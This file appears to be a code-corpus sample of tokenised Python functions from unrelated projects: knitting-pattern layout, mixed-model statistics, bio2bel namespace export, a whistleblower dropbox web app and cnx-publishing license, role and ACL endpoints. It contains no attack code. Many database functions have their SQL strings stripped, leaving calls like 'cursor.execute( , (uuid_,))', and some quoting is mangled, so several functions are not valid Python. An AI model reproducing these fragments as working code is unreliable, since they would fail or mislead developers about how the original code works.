def _connect_rows ( self , connections ) : for connection in connections : from_row_id = self . _to_id ( connection [ FROM ] [ ID ] ) from_row = self . _id_cache [ from_row_id ] from_row_start_index = connection [ FROM ] . get ( START , DEFAULT_START ) from_row_number_of_possible_meshes = from_row . number_of_produced_meshes - from_row_start_index to_row_id = self . _to_id ( connection [ TO ] [ ID ] ) to_row = self . _id_cache [ to_row_id ] to_row_start_index = connection [ TO ] . get ( START , DEFAULT_START ) to_row_number_of_possible_meshes = to_row . number_of_consumed_meshes - to_row_start_index meshes = min ( from_row_number_of_possible_meshes , to_row_number_of_possible_meshes ) # TODO: test all kinds of connections number_of_meshes = connection . get ( MESHES , meshes ) from_row_stop_index = from_row_start_index + number_of_meshes to_row_stop_index = to_row_start_index + number_of_meshes assert 0 <= from_row_start_index <= from_row_stop_index produced_meshes = from_row . produced_meshes [ from_row_start_index : from_row_stop_index ] assert 0 <= to_row_start_index <= to_row_stop_index consumed_meshes = to_row . consumed_meshes [ to_row_start_index : to_row_stop_index ] assert len ( produced_meshes ) == len ( consumed_meshes ) mesh_pairs = zip ( produced_meshes , consumed_meshes ) for produced_mesh , consumed_mesh in mesh_pairs : produced_mesh . connect_to ( consumed_mesh )
def _create_pattern_set ( self , pattern , values ) : type_ = self . _get_type ( values ) version = self . _get_version ( values ) comment = values . get ( COMMENT ) self . _pattern_set = self . _spec . new_pattern_set ( type_ , version , pattern , self , comment )
def write ( self , bytes_ ) : string = bytes_ . decode ( self . _encoding ) self . _file . write ( string )
def write ( self , string ) : bytes_ = string . encode ( self . _encoding ) self . _file . write ( bytes_ )
def _width ( self ) : layout = self . _instruction . get ( GRID_LAYOUT ) if layout is not None : width = layout . get ( WIDTH ) if width is not None : return width return self . _instruction . number_of_consumed_meshes
def _step ( self , row , position , passed ) : if row in passed or not self . _row_should_be_placed ( row , position ) : return self . _place_row ( row , position ) passed = [ row ] + passed # print("{}{} at\t{} {}".format("  " * len(passed), row, position, #                               passed)) for i , produced_mesh in enumerate ( row . produced_meshes ) : self . _expand_produced_mesh ( produced_mesh , i , position , passed ) for i , consumed_mesh in enumerate ( row . consumed_meshes ) : self . _expand_consumed_mesh ( consumed_mesh , i , position , passed )
def _expand_consumed_mesh ( self , mesh , mesh_index , row_position , passed ) : if not mesh . is_produced ( ) : return row = mesh . producing_row position = Point ( row_position . x + mesh . index_in_producing_row - mesh_index , row_position . y - INSTRUCTION_HEIGHT ) self . _expand ( row , position , passed )
def _expand_produced_mesh ( self , mesh , mesh_index , row_position , passed ) : if not mesh . is_consumed ( ) : return row = mesh . consuming_row position = Point ( row_position . x - mesh . index_in_consuming_row + mesh_index , row_position . y + INSTRUCTION_HEIGHT ) self . _expand ( row , position , passed )
def _place_row ( self , row , position ) : self . _rows_in_grid [ row ] = RowInGrid ( row , position )
def _walk ( self ) : while self . _todo : args = self . _todo . pop ( 0 ) self . _step ( * args )
def instruction_in_grid ( self , instruction ) : row_position = self . _rows_in_grid [ instruction . row ] . xy x = instruction . index_of_first_consumed_mesh_in_row position = Point ( row_position . x + x , row_position . y ) return InstructionInGrid ( instruction , position )
def _dump_to_file ( self , file ) : xmltodict . unparse ( self . object ( ) , file , pretty = True )
def rsolve ( A , y ) : from numpy_sugar . linalg import rsolve as _rsolve try : beta = _rsolve ( A , y ) except LinAlgError : msg = "Could not converge to solve Ax=y." msg += " Setting x to zero." warnings . warn ( msg , RuntimeWarning ) beta = zeros ( A . shape [ 0 ] ) return beta
def B ( self ) : return unvec ( self . _vecB . value , ( self . X . shape [ 1 ] , self . A . shape [ 0 ] ) )
def posteriori_covariance ( self ) : K = GLMM . covariance ( self ) tau = self . _ep . _posterior . tau return pinv ( pinv ( K ) + diag ( 1 / tau ) )
def economic_qs_zeros ( n ) : Q0 = empty ( ( n , 0 ) ) Q1 = eye ( n ) S0 = empty ( 0 ) return ( ( Q0 , Q1 ) , S0 )
def value ( self ) : if not self . _fix [ "beta" ] : self . _update_beta ( ) if not self . _fix [ "scale" ] : self . _update_scale ( ) return self . lml ( )
def delta ( self ) : v = float ( self . _logistic . value ) if v > 0.0 : v = 1 / ( 1 + exp ( - v ) ) else : v = exp ( v ) v = v / ( v + 1.0 ) return min ( max ( v , epsilon . tiny ) , 1 - epsilon . tiny )
def _df ( self ) : if not self . _restricted : return self . nsamples return self . nsamples - self . _X [ "tX" ] . shape [ 1 ]
def setup_smtp_factory ( * * settings ) : return CustomSMTP ( host = settings . get ( 'mail.host' , 'localhost' ) , port = int ( settings . get ( 'mail.port' , 25 ) ) , user = settings . get ( 'mail.user' ) , password = settings . get ( 'mail.password' ) , timeout = float ( settings . get ( 'mail.timeout' , 60 ) ) , )
def begin ( self ) : self . connect ( self . host , self . port ) if self . user : self . starttls ( ) self . login ( self . user , self . password )
def create_application ( connection : Optional [ str ] = None ) -> Flask : app = Flask ( __name__ ) flask_bootstrap . Bootstrap ( app ) Admin ( app ) connection = connection or DEFAULT_CACHE_CONNECTION engine , session = build_engine_session ( connection ) for name , add_admin in add_admins . items ( ) : url = '/{}' . format ( name ) add_admin ( app , session , url = url , endpoint = name , name = name ) log . debug ( 'added %s - %s to %s' , name , add_admin , url ) app . register_blueprint ( ui ) return app
def upload_backend ( index = 'dev' , user = None ) : get_vars ( ) use_devpi ( index = index ) with fab . lcd ( '../application' ) : fab . local ( 'make upload' )
async def update ( self ) -> None : _LOGGER . debug ( "Requesting state update from server (S00, S14)" ) await asyncio . gather ( # List unsealed Zones self . send_command ( 'S00' ) , # Arming status update self . send_command ( 'S14' ) , )
async def _update_loop ( self ) -> None : await asyncio . sleep ( self . _update_interval ) while not self . _closed : await self . update ( ) await asyncio . sleep ( self . _update_interval )
def _iterate_namespace_models ( self , * * kwargs ) -> Iterable : return tqdm ( self . _get_query ( self . namespace_model ) , total = self . _count_model ( self . namespace_model ) , * * kwargs )
def _get_default_namespace ( self ) -> Optional [ Namespace ] : return self . _get_query ( Namespace ) . filter ( Namespace . url == self . _get_namespace_url ( ) ) . one_or_none ( )
def _make_namespace ( self ) -> Namespace : namespace = Namespace ( name = self . _get_namespace_name ( ) , keyword = self . _get_namespace_keyword ( ) , url = self . _get_namespace_url ( ) , version = str ( time . asctime ( ) ) , ) self . session . add ( namespace ) entries = self . _get_namespace_entries ( namespace ) self . session . add_all ( entries ) t = time . time ( ) log . info ( 'committing models' ) self . session . commit ( ) log . info ( 'committed models in %.2f seconds' , time . time ( ) - t ) return namespace
def add_namespace_to_graph ( self , graph : BELGraph ) -> Namespace : namespace = self . upload_bel_namespace ( ) graph . namespace_url [ namespace . keyword ] = namespace . url # Add this manager as an annotation, too self . _add_annotation_to_graph ( graph ) return namespace
def _add_annotation_to_graph ( self , graph : BELGraph ) -> None : if 'bio2bel' not in graph . annotation_list : graph . annotation_list [ 'bio2bel' ] = set ( ) graph . annotation_list [ 'bio2bel' ] . add ( self . module_name )
def drop_bel_namespace ( self ) -> Optional [ Namespace ] : namespace = self . _get_default_namespace ( ) if namespace is not None : for entry in tqdm ( namespace . entries , desc = f'deleting entries in {self._get_namespace_name()}' ) : self . session . delete ( entry ) self . session . delete ( namespace ) log . info ( 'committing deletions' ) self . session . commit ( ) return namespace
def write_bel_namespace ( self , file : TextIO , use_names : bool = False ) -> None : if not self . is_populated ( ) : self . populate ( ) if use_names and not self . has_names : raise ValueError values = ( self . _get_namespace_name_to_encoding ( desc = 'writing names' ) if use_names else self . _get_namespace_identifier_to_encoding ( desc = 'writing identifiers' ) ) write_namespace ( namespace_name = self . _get_namespace_name ( ) , namespace_keyword = self . _get_namespace_keyword ( ) , namespace_query_url = self . identifiers_url , values = values , file = file , )
def write_bel_annotation ( self , file : TextIO ) -> None : if not self . is_populated ( ) : self . populate ( ) values = self . _get_namespace_name_to_encoding ( desc = 'writing names' ) write_annotation ( keyword = self . _get_namespace_keyword ( ) , citation_name = self . _get_namespace_name ( ) , description = '' , values = values , file = file , )
def write_bel_namespace_mappings ( self , file : TextIO , * * kwargs ) -> None : json . dump ( self . _get_namespace_identifier_to_name ( * * kwargs ) , file , indent = 2 , sort_keys = True )
def write_directory ( self , directory : str ) -> bool : current_md5_hash = self . get_namespace_hash ( ) md5_hash_path = os . path . join ( directory , f'{self.module_name}.belns.md5' ) if not os . path . exists ( md5_hash_path ) : old_md5_hash = None else : with open ( md5_hash_path ) as file : old_md5_hash = file . read ( ) . strip ( ) if old_md5_hash == current_md5_hash : return False with open ( os . path . join ( directory , f'{self.module_name}.belns' ) , 'w' ) as file : self . write_bel_namespace ( file , use_names = False ) with open ( md5_hash_path , 'w' ) as file : print ( current_md5_hash , file = file ) if self . has_names : with open ( os . path . join ( directory , f'{self.module_name}-names.belns' ) , 'w' ) as file : self . write_bel_namespace ( file , use_names = True ) with open ( os . path . join ( directory , f'{self.module_name}.belns.mapping' ) , 'w' ) as file : self . write_bel_namespace_mappings ( file , desc = 'writing mapping' ) return True
def get_long_description ( ) : with codecs . open ( os . path . join ( HERE , 'README.rst' ) , encoding = 'utf-8' ) as f : long_description = f . read ( ) return long_description
def dropbox_factory ( request ) : try : return request . registry . settings [ 'dropbox_container' ] . get_dropbox ( request . matchdict [ 'drop_id' ] ) except KeyError : raise HTTPNotFound ( 'no such dropbox' )
def dropbox_editor_factory ( request ) : dropbox = dropbox_factory ( request ) if is_equal ( dropbox . editor_token , request . matchdict [ 'editor_token' ] . encode ( 'utf-8' ) ) : return dropbox else : raise HTTPNotFound ( 'invalid editor token' )
def sanitize_filename ( filename ) : # TODO: fix broken splitext (it reveals everything of the filename after the first `.` - doh!) token = generate_drop_id ( ) name , extension = splitext ( filename ) if extension : return '%s%s' % ( token , extension ) else : return token
def _create_archive ( self ) : self . status = u'270 creating final encrypted backup of cleansed attachments' return self . _create_encrypted_zip ( source = 'clean' , fs_target_dir = self . container . fs_archive_cleansed )
def size_attachments ( self ) : total_size = 0 for attachment in self . fs_cleansed_attachments : total_size += stat ( attachment ) . st_size return total_size
def replies ( self ) : fs_reply_path = join ( self . fs_replies_path , 'message_001.txt' ) if exists ( fs_reply_path ) : return [ load ( open ( fs_reply_path , 'r' ) ) ] else : return [ ]
def message ( self ) : try : with open ( join ( self . fs_path , u'message' ) ) as message_file : return u'' . join ( [ line . decode ( 'utf-8' ) for line in message_file . readlines ( ) ] ) except IOError : return u''
def fs_dirty_attachments ( self ) : if exists ( self . fs_attachment_container ) : return [ join ( self . fs_attachment_container , attachment ) for attachment in listdir ( self . fs_attachment_container ) ] else : return [ ]
def fs_cleansed_attachments ( self ) : if exists ( self . fs_cleansed_attachment_container ) : return [ join ( self . fs_cleansed_attachment_container , attachment ) for attachment in listdir ( self . fs_cleansed_attachment_container ) ] else : return [ ]
def dropbox_form ( request ) : from briefkasten import generate_post_token token = generate_post_token ( secret = request . registry . settings [ 'post_secret' ] ) return dict ( action = request . route_url ( 'dropbox_form_submit' , token = token ) , fileupload_url = request . route_url ( 'dropbox_fileupload' , token = token ) , * * defaults ( request ) )
def dropbox_fileupload ( dropbox , request ) : attachment = request . POST [ 'attachment' ] attached = dropbox . add_attachment ( attachment ) return dict ( files = [ dict ( name = attached , type = attachment . type , ) ] )
def dropbox_submission ( dropbox , request ) : try : data = dropbox_schema . deserialize ( request . POST ) except Exception : return HTTPFound ( location = request . route_url ( 'dropbox_form' ) ) # set the message dropbox . message = data . get ( 'message' ) # recognize submission from watchdog if 'testing_secret' in dropbox . settings : dropbox . from_watchdog = is_equal ( unicode ( dropbox . settings [ 'test_submission_secret' ] ) , data . pop ( 'testing_secret' , u'' ) ) # a non-js client might have uploaded an attachment via the form's fileupload field: if data . get ( 'upload' ) is not None : dropbox . add_attachment ( data [ 'upload' ] ) # now we can call the process method dropbox . submit ( ) drop_url = request . route_url ( 'dropbox_view' , drop_id = dropbox . drop_id ) print ( "Created dropbox %s" % drop_url ) return HTTPFound ( location = drop_url )
def belns ( keyword : str , file : TextIO , encoding : Optional [ str ] , use_names : bool ) : directory = get_data_dir ( keyword ) obo_url = f'http://purl.obolibrary.org/obo/{keyword}.obo' obo_path = os . path . join ( directory , f'{keyword}.obo' ) obo_cache_path = os . path . join ( directory , f'{keyword}.obo.pickle' ) obo_getter = make_obo_getter ( obo_url , obo_path , preparsed_path = obo_cache_path ) graph = obo_getter ( ) convert_obo_graph_to_belns ( graph , file = file , encoding = encoding , use_names = use_names , )
def belanno ( keyword : str , file : TextIO ) : directory = get_data_dir ( keyword ) obo_url = f'http://purl.obolibrary.org/obo/{keyword}.obo' obo_path = os . path . join ( directory , f'{keyword}.obo' ) obo_cache_path = os . path . join ( directory , f'{keyword}.obo.pickle' ) obo_getter = make_obo_getter ( obo_url , obo_path , preparsed_path = obo_cache_path ) graph = obo_getter ( ) convert_obo_graph_to_belanno ( graph , file = file , )
def _store_helper ( model : Action , session : Optional [ Session ] = None ) -> None : if session is None : session = _make_session ( ) session . add ( model ) session . commit ( ) session . close ( )
def _make_session ( connection : Optional [ str ] = None ) -> Session : if connection is None : connection = get_global_connection ( ) engine = create_engine ( connection ) create_all ( engine ) session_cls = sessionmaker ( bind = engine ) session = session_cls ( ) return session
def create_all ( engine , checkfirst = True ) : Base . metadata . create_all ( bind = engine , checkfirst = checkfirst )
def ls ( cls , session : Optional [ Session ] = None ) -> List [ 'Action' ] : if session is None : session = _make_session ( ) actions = session . query ( cls ) . order_by ( cls . created . desc ( ) ) . all ( ) session . close ( ) return actions
def count ( cls , session : Optional [ Session ] = None ) -> int : if session is None : session = _make_session ( ) count = session . query ( cls ) . count ( ) session . close ( ) return count
def get_module_config_cls ( module_name : str ) -> Type [ _AbstractModuleConfig ] : # noqa: D202 class ModuleConfig ( _AbstractModuleConfig ) : NAME = f'bio2bel:{module_name}' FILES = DEFAULT_CONFIG_PATHS + [ os . path . join ( DEFAULT_CONFIG_DIRECTORY , module_name , 'config.ini' ) ] return ModuleConfig
def get_modules ( ) -> Mapping : modules = { } for entry_point in iter_entry_points ( group = 'bio2bel' , name = None ) : entry = entry_point . name try : modules [ entry ] = entry_point . load ( ) except VersionConflict as exc : log . warning ( 'Version conflict in %s: %s' , entry , exc ) continue except UnknownExtra as exc : log . warning ( 'Unknown extra in %s: %s' , entry , exc ) continue except ImportError as exc : log . exception ( 'Issue with importing module %s: %s' , entry , exc ) continue return modules
def clear_cache ( module_name : str , keep_database : bool = True ) -> None : data_dir = get_data_dir ( module_name ) if not os . path . exists ( data_dir ) : return for name in os . listdir ( data_dir ) : if name in { 'config.ini' , 'cfg.ini' } : continue if name == 'cache.db' and keep_database : continue path = os . path . join ( data_dir , name ) if os . path . isdir ( path ) : shutil . rmtree ( path ) else : os . remove ( path ) os . rmdir ( data_dir )
def _iterate_managers ( connection , skip ) : for idx , name , manager_cls in _iterate_manage_classes ( skip ) : if name in skip : continue try : manager = manager_cls ( connection = connection ) except TypeError as e : click . secho ( f'Could not instantiate {name}: {e}' , fg = 'red' ) else : yield idx , name , manager
def clear ( skip ) : for name in sorted ( MODULES ) : if name in skip : continue click . secho ( f'clearing cache for {name}' , fg = 'cyan' , bold = True ) clear_cache ( name )
def sheet ( connection , skip , file : TextIO ) : from tabulate import tabulate header = [ '' , 'Name' , 'Description' , 'Terms' , 'Relations' ] rows = [ ] for i , ( idx , name , manager ) in enumerate ( _iterate_managers ( connection , skip ) , start = 1 ) : try : if not manager . is_populated ( ) : continue except AttributeError : click . secho ( f'{name} does not implement is_populated' , fg = 'red' ) continue terms , relations = None , None if isinstance ( manager , BELNamespaceManagerMixin ) : terms = manager . _count_model ( manager . namespace_model ) if isinstance ( manager , BELManagerMixin ) : try : relations = manager . count_relations ( ) except TypeError as e : relations = str ( e ) rows . append ( ( i , name , manager . __doc__ . split ( '\n' ) [ 0 ] . strip ( ) . strip ( '.' ) , terms , relations ) ) print ( tabulate ( rows , headers = header , # tablefmt="fancy_grid", ) )
def write ( connection , skip , directory , force ) : os . makedirs ( directory , exist_ok = True ) from . manager . bel_manager import BELManagerMixin import pybel for idx , name , manager in _iterate_managers ( connection , skip ) : if not isinstance ( manager , BELManagerMixin ) : continue click . secho ( name , fg = 'cyan' , bold = True ) path = os . path . join ( directory , f'{name}.bel.pickle' ) if os . path . exists ( path ) and not force : click . echo ( ' already exported')  continue if not manager . is_populated ( ) : click . echo ( ' unpopulated')  else : graph = manager . to_bel ( ) pybel . to_pickle ( graph , path ) pybel . to_json_path ( graph , os . path . join ( directory , f'{name}.bel.json' ) )
def web ( connection , host , port ) : from bio2bel . web . application import create_application app = create_application ( connection = connection ) app . run ( host = host , port = port )
def actions ( connection ) : session = _make_session ( connection = connection ) for action in Action . ls ( session = session ) : click . echo ( f'{action.created} {action.action} {action.resource}' )
def count_relations ( self ) -> int : if self . edge_model is ... : raise Bio2BELMissingEdgeModelError ( 'edge_edge model is undefined/count_bel_relations is not overridden' ) elif isinstance ( self . edge_model , list ) : return sum ( self . _count_model ( m ) for m in self . edge_model ) else : return self . _count_model ( self . edge_model )
def get_exif_info ( self ) : _dict = { } for tag in _EXIF_TAGS : ret = self . img . attribute ( "EXIF:%s" % tag ) if ret and ret != 'unknown' : _dict [ tag ] = ret return _dict
def get_version_from_pc ( search_dirs , target ) : for dirname in search_dirs : for root , dirs , files in os . walk ( dirname ) : for f in files : if f == target : file_path = os . path . join ( root , target ) _tmp = _grep ( "Version: " , file_path ) version = _tmp . split ( ) [ 1 ] print ( "Found version %s in file %s" % ( version , file_path ) ) return version
def version ( ) : with io . open ( 'pgmagick/_version.py' ) as input_file : for line in input_file : if line . startswith ( '__version__' ) : return ast . parse ( line ) . body [ 0 ] . value . s
def post_license_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted_data = request . json license_url = posted_data . get ( 'license_url' ) licensors = posted_data . get ( 'licensors' , [ ] ) with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( uuid_ , ) ) try : # Check that the license exists existing_license_url = cursor . fetchone ( ) [ 0 ] except TypeError : # NoneType if request . has_permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid_ , ) ) existing_license_url = None else : raise httpexceptions . HTTPNotFound ( ) if existing_license_url is None and license_url is None : raise httpexceptions . HTTPBadRequest ( "license_url is required" ) elif ( license_url != existing_license_url or existing_license_url is None ) : cursor . execute ( , ( license_url , ) ) try : # Check that it is a valid license id cursor . fetchone ( ) [ 0 ] except TypeError : # None returned raise httpexceptions . HTTPBadRequest ( "invalid license_url" ) upsert_license_requests ( cursor , uuid_ , licensors ) resp = request . response resp . status_int = 202 return resp
def delete_license_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted_uids = [ x [ 'uid' ] for x in request . json . get ( 'licensors' , [ ] ) ] with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : remove_license_requests ( cursor , uuid_ , posted_uids ) resp = request . response resp . status_int = 200 return resp
def get_roles_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] user_id = request . matchdict . get ( 'uid' ) args = [ uuid_ ] if user_id is not None : fmt_conditional = "AND user_id = %s" args . append ( user_id ) else : fmt_conditional = "" with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( . format ( fmt_conditional ) , args ) acceptances = [ r [ 0 ] for r in cursor . fetchall ( ) ] if not acceptances : if user_id is not None : raise httpexceptions . HTTPNotFound ( ) else : cursor . execute ( , ( uuid_ , ) ) try : cursor . fetchone ( ) [ 0 ] except TypeError : # NoneType raise httpexceptions . HTTPNotFound ( ) resp_value = acceptances if user_id is not None : resp_value = acceptances [ 0 ] return resp_value
def post_roles_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted_roles = request . json with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( uuid_ , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except TypeError : if request . has_permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid_ , ) ) else : raise httpexceptions . HTTPNotFound ( ) try : upsert_users ( cursor , [ r [ 'uid' ] for r in posted_roles ] ) except UserFetchError as exc : raise httpexceptions . HTTPBadRequest ( exc . message ) upsert_role_requests ( cursor , uuid_ , posted_roles ) resp = request . response resp . status_int = 202 return resp
def delete_roles_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted_roles = request . json with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : remove_role_requests ( cursor , uuid_ , posted_roles ) resp = request . response resp . status_int = 200 return resp
def get_acl ( request ) : uuid_ = request . matchdict [ 'uuid' ] with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( uuid_ , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except TypeError : raise httpexceptions . HTTPNotFound ( ) cursor . execute ( , ( uuid_ , ) ) acl = [ r [ 0 ] for r in cursor . fetchall ( ) ] return acl
def post_acl_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted = request . json permissions = [ ( x [ 'uid' ] , x [ 'permission' ] , ) for x in posted ] with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( uuid_ , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except TypeError : if request . has_permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid_ , ) ) else : raise httpexceptions . HTTPNotFound ( ) upsert_acl ( cursor , uuid_ , permissions ) resp = request . response resp . status_int = 202 return resp
def delete_acl_request ( request ) : uuid_ = request . matchdict [ 'uuid' ] posted = request . json permissions = [ ( x [ 'uid' ] , x [ 'permission' ] , ) for x in posted ] with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : remove_acl ( cursor , uuid_ , permissions ) resp = request . response resp . status_int = 200 return resp
def lookup_api_key_info ( ) : info = { } with db_connect ( ) as conn : with conn . cursor ( ) as cursor : cursor . execute ( ALL_KEY_INFO_SQL_STMT ) for row in cursor . fetchall ( ) : id , key , name , groups = row user_id = "api_key:{}" . format ( id ) info [ key ] = dict ( id = id , user_id = user_id , name = name , groups = groups ) return info
def includeme ( config ) : api_key_authn_policy = APIKeyAuthenticationPolicy ( ) config . include ( 'openstax_accounts' ) openstax_authn_policy = config . registry . getUtility ( IOpenstaxAccountsAuthenticationPolicy ) # Set up api & user authentication policies. policies = [ api_key_authn_policy , openstax_authn_policy ] authn_policy = MultiAuthenticationPolicy ( policies ) config . set_authentication_policy ( authn_policy ) # Set up the authorization policy. authz_policy = ACLAuthorizationPolicy ( ) config . set_authorization_policy ( authz_policy )
def expandvars_dict ( settings ) : return dict ( ( key , os . path . expandvars ( value ) ) for key , value in settings . iteritems ( ) )
def task ( * * kwargs ) : def wrapper ( wrapped ) : def callback ( scanner , name , obj ) : celery_app = scanner . config . registry . celery_app celery_app . task ( * * kwargs ) ( obj ) venusian . attach ( wrapped , callback ) return wrapped return wrapper
def post_publication_processing ( event , cursor ) : module_ident , ident_hash = event . module_ident , event . ident_hash celery_app = get_current_registry ( ) . celery_app # Check baking is not already queued. cursor . execute ( 'SELECT result_id::text ' 'FROM document_baking_result_associations ' 'WHERE module_ident = %s' , ( module_ident , ) ) for result in cursor . fetchall ( ) : state = celery_app . AsyncResult ( result [ 0 ] ) . state if state in ( 'QUEUED' , 'STARTED' , 'RETRY' ) : logger . debug ( 'Already queued module_ident={} ident_hash={}' . format ( module_ident , ident_hash ) ) return logger . debug ( 'Queued for processing module_ident={} ident_hash={}' . format ( module_ident , ident_hash ) ) recipe_ids = _get_recipe_ids ( module_ident , cursor ) update_module_state ( cursor , module_ident , 'processing' , recipe_ids [ 0 ] ) # Commit the state change before preceding. cursor . connection . commit ( ) # Start of task # FIXME Looking up the task isn't the most clear usage here. task_name = 'cnxpublishing.subscribers.baking_processor' baking_processor = celery_app . tasks [ task_name ] result = baking_processor . delay ( module_ident , ident_hash ) baking_processor . backend . store_result ( result . id , None , 'QUEUED' ) # Save the mapping between a celery task and this event. track_baking_proc_state ( result , module_ident , cursor )
def parse_archive_uri ( uri ) : parsed = urlparse ( uri ) path = parsed . path . rstrip ( '/' ) . split ( '/' ) ident_hash = path [ - 1 ] ident_hash = unquote ( ident_hash ) return ident_hash
def declare_browsable_routes ( config ) : # This makes our routes slashed, which is good browser behavior. config . add_notfound_view ( default_exceptionresponse_view , append_slash = True ) add_route = config . add_route add_route ( 'admin-index' , '/a/' ) add_route ( 'admin-moderation' , '/a/moderation/' ) add_route ( 'admin-api-keys' , '/a/api-keys/' ) add_route ( 'admin-add-site-messages' , '/a/site-messages/' , request_method = 'GET' ) add_route ( 'admin-add-site-messages-POST' , '/a/site-messages/' , request_method = 'POST' ) add_route ( 'admin-delete-site-messages' , '/a/site-messages/' , request_method = 'DELETE' ) add_route ( 'admin-edit-site-message' , '/a/site-messages/{id}/' , request_method = 'GET' ) add_route ( 'admin-edit-site-message-POST' , '/a/site-messages/{id}/' , request_method = 'POST' ) add_route ( 'admin-content-status' , '/a/content-status/' ) add_route ( 'admin-content-status-single' , '/a/content-status/{uuid}' ) add_route ( 'admin-print-style' , '/a/print-style/' ) add_route ( 'admin-print-style-single' , '/a/print-style/{style}' )
def includeme ( config ) : config . include ( 'pyramid_jinja2' ) config . add_jinja2_renderer ( '.html' ) config . add_jinja2_renderer ( '.rss' ) config . add_static_view ( name = '/a/static' , path = "cnxpublishing:static/" ) # Commit the configuration otherwise the jija2_env won't have # a `globals` assignment. config . commit ( ) # Place a few globals in the template environment. from cnxdb . ident_hash import join_ident_hash for ext in ( '.html' , '.rss' , ) : jinja2_env = config . get_jinja2_environment ( ext ) jinja2_env . globals . update ( join_ident_hash = join_ident_hash , ) declare_api_routes ( config ) declare_browsable_routes ( config )
def _formatter_callback_factory ( ) : # pragma: no cover includes = [ ] exercise_url_template = '{baseUrl}/api/exercises?q={field}:"{{itemCode}}"' settings = get_current_registry ( ) . settings exercise_base_url = settings . get ( 'embeddables.exercise.base_url' , None ) exercise_matches = [ match . split ( ',' , 1 ) for match in aslist ( settings . get ( 'embeddables.exercise.match' , '' ) , flatten = False ) ] exercise_token = settings . get ( 'embeddables.exercise.token' , None ) mathml_url = settings . get ( 'mathmlcloud.url' , None ) memcache_servers = settings . get ( 'memcache_servers' ) if memcache_servers : memcache_servers = memcache_servers . split ( ) else : memcache_servers = None if exercise_base_url and exercise_matches : mc_client = None if memcache_servers : mc_client = memcache . Client ( memcache_servers , debug = 0 ) for ( exercise_match , exercise_field ) in exercise_matches : template = exercise_url_template . format ( baseUrl = exercise_base_url , field = exercise_field ) includes . append ( exercise_callback_factory ( exercise_match , template , mc_client , exercise_token , mathml_url ) ) return includes
def db_connect ( connection_string = None , * * kwargs ) : if connection_string is None : connection_string = get_current_registry ( ) . settings [ CONNECTION_STRING ] db_conn = psycopg2 . connect ( connection_string , * * kwargs ) try : with db_conn : yield db_conn finally : db_conn . close ( )
def upsert_pending_licensors ( cursor , document_id ) : cursor . execute ( , ( document_id , ) ) uuid_ , metadata = cursor . fetchone ( ) acceptors = set ( [ uid for uid , type_ in _dissect_roles ( metadata ) ] ) # Acquire a list of existing acceptors. cursor . execute ( , ( uuid_ , ) ) existing_acceptors_mapping = dict ( cursor . fetchall ( ) ) # Who's not in the existing list? existing_acceptors = set ( existing_acceptors_mapping . keys ( ) ) new_acceptors = acceptors . difference ( existing_acceptors ) # Insert the new licensor acceptors. for acceptor in new_acceptors : cursor . execute ( , ( uuid_ , acceptor , ) ) # Has everyone already accepted? cursor . execute ( , ( uuid_ , ) ) defectors = set ( cursor . fetchall ( ) ) if not defectors : # Update the pending document license acceptance state. cursor . execute ( , ( document_id , ) )
def upsert_pending_roles ( cursor , document_id ) : cursor . execute ( , ( document_id , ) ) uuid_ , metadata = cursor . fetchone ( ) acceptors = set ( [ ( uid , _role_type_to_db_type ( type_ ) , ) for uid , type_ in _dissect_roles ( metadata ) ] ) # Upsert the user info. upsert_users ( cursor , [ x [ 0 ] for x in acceptors ] ) # Acquire a list of existing acceptors. cursor . execute ( , ( uuid_ , ) ) existing_roles = set ( [ ( r , t , ) for r , t in cursor . fetchall ( ) ] ) # Who's not in the existing list? existing_acceptors = existing_roles new_acceptors = acceptors . difference ( existing_acceptors ) # Insert the new role acceptors. for acceptor , type_ in new_acceptors : cursor . execute ( , ( uuid_ , acceptor , type_ ) ) # Has everyone already accepted? cursor . execute ( , ( uuid_ , ) ) defectors = set ( cursor . fetchall ( ) ) if not defectors : # Update the pending document license acceptance state. cursor . execute ( , ( document_id , ) )
def obtain_licenses ( ) : with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( ) licenses = { r [ 0 ] : r [ 1 ] for r in cursor . fetchall ( ) } return licenses
def _validate_license ( model ) : license_mapping = obtain_licenses ( ) try : license_url = model . metadata [ 'license_url' ] except KeyError : raise exceptions . MissingRequiredMetadata ( 'license_url' ) try : license = license_mapping [ license_url ] except KeyError : raise exceptions . InvalidLicense ( license_url ) if not license [ 'is_valid_for_publication' ] : raise exceptions . InvalidLicense ( license_url )
def validate_model ( cursor , model ) : # Check the license is one valid for publication. _validate_license ( model ) _validate_roles ( model ) # Other required metadata includes: title, summary required_metadata = ( 'title' , 'summary' , ) for metadata_key in required_metadata : if model . metadata . get ( metadata_key ) in [ None , '' , [ ] ] : raise exceptions . MissingRequiredMetadata ( metadata_key ) # Ensure that derived-from values are either None # or point at a live record in the archive. _validate_derived_from ( cursor , model ) # FIXME Valid language code? # Are the given 'subjects' _validate_subjects ( cursor , model )
